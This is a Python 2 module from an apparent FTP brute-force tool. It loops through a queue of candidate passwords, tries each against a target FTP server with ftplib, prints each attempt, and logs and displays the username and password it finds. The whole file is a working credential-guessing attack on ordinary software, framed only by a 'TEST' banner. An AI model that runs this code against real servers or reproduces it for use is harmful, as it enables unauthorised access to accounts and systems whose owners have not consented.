#!/usr/bin/env python
# -*- coding: utf-8 -*-

import ftplib
from termcolor import colored
from log import Log
import sys

class FTP(object):

    def __init__(self):
        pass

    def validate(self, target, port):
        return True

    def attack(self, target, port, username, password, method):

        try:
            ftp = ftplib.FTP(target)
            ftp.login(username, password)

            return True

        except Exception, e:
            return False

    def brute_force(self, target, port, username, passwords, method):

        print ""
        print colored("==========================[STARTING TEST]==========================", 'yellow', attrs=['bold'])
        print colored("STARTING FTP TEST ON HOST: %s:%s", 'blue', attrs=['bold']) % (target, port)
        print ""

        i = 0

        if self.validate(target, port):

            while not passwords.empty():

                i = i + 1

                password = passwords.get()

                print colored('[%s]         USER[%s]          PASS [%s]', 'yellow') % (i, username, password)

                if self.attack(target, port, username, password, method):

                    print ""
                    print colored("==========================[LOGIN FOUND]============================", 'yellow', attrs=['bold'])
                    print ""
                    print colored("===================================================================", 'yellow', attrs=['bold'])
                    print colored("               [  :: USER[%s] AND PASS[%s]  ]                      ", 'green', attrs=['bold']) % (username, password)
                    print colored("===================================================================", 'yellow', attrs=['bold'])

                    Log.found(target, port, username, password, method)

                    return True